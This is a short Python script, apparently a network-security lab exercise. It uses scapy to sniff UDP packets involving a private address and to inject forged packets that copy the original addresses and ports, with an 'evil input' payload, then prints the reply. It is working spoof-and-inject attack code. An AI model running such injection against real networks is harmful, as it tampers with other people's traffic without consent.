from scapy.all import *
import sys


print('Sniffing...')

while True:
    pkts = sniff(filter="udp and host 192.168.2.6", count=1)
    old_pkt = pkts[0][IP]
    new_pkt = IP(dst=old_pkt.dst, src=old_pkt.src)/UDP(dport=old_pkt.dport, sport=old_pkt.sport)/Raw(load="This is evil input! >:)")
    new_pkt.show()
    resp, unans = sr(new_pkt)
    print(resp[0][1].load)
